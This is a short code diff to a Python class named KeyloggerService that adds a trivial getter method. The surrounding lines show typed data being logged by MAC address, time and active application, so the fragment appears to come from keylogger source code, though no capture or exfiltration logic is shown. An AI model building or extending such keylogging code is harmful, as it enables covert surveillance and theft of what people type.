@@ -58,6 +58,10 @@ class KeyloggerService:
             dictionary[current_mac_address][current_time][self.current_app] = []
         dictionary[current_mac_address][current_time][self.current_app].append(data)
 
+
+    def  return_action(self):
+        return self.__action
+
     def start(self):
         self.__change_action()
         while self.__action:
